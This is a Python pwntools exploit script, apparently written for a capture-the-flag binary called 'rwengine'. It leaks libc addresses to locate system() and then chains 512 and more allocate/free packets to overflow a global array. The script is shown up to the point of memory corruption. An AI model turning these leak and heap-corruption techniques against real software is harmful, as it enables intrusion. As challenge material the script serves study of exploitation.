from pwn import *
import struct

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

# Leak
send_pkt(0x10, b" " * 200)
status, resp = recv_pkt()
page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])
libc = ELF("./libc.so.6")
libc_base = toupper_addr - libc.symbols['toupper']
system_addr = libc_base + libc.symbols['system']

log.info(f"page_ptr = {hex(page_ptr)}")
log.info(f"libc_base = {hex(libc_base)}")
log.info(f"system_addr = {hex(system_addr)}")

# Step 1: Allocate 511 chunks of size 1 (indices 0..510)
log.info("Allocating 511 chunks of size 1...")
for i in range(511):
    send_pkt(0x12, struct.pack(">H", 1))
    recv_pkt()

# Step 2: Allocate 1 chunk of size 2 (index 511)
send_pkt(0x12, struct.pack(">H", 2))
recv_pkt()

# Step 3: Free chunks 0..510 (511 frees, DAT_00118040 = 511)
log.info("Freeing 511 chunks of size 1...")
for i in range(511):
    send_pkt(0x13, struct.pack(">H", i))
    recv_pkt()

# Step 4: Free chunk 511 (size 2). This is write #512 at DAT_00118060[511] which is 0x18860 (DAT_00118860)!
# It writes 511 (0x01ff) to DAT_00118860!
log.info("Freeing chunk 511 (512th free -> overwrites DAT_00118860)...")
send_pkt(0x13, struct.pack(">H", 511))
status, _ = recv_pkt()
log.info(f"512th free status: {status}")

# Step 5: Now allocate with size 3 (which is NOT in the free list)!
# This creates a fresh chunk without decrementing DAT_00118040!
log.info("Allocating with size 3...")
send_pkt(0x12, struct.pack(">H", 3))
status, resp = recv_pkt()
new_chunk_idx = struct.unpack(">H", resp)[0]
log.info(f"New chunk allocated at index: {new_chunk_idx}")

# Step 6: Free new_chunk_idx!
# This is write #513!
send_pkt(0x13, struct.pack(">H", new_chunk_idx))
status, _ = recv_pkt()
log.info(f"513th free status: {status}")

io.close()
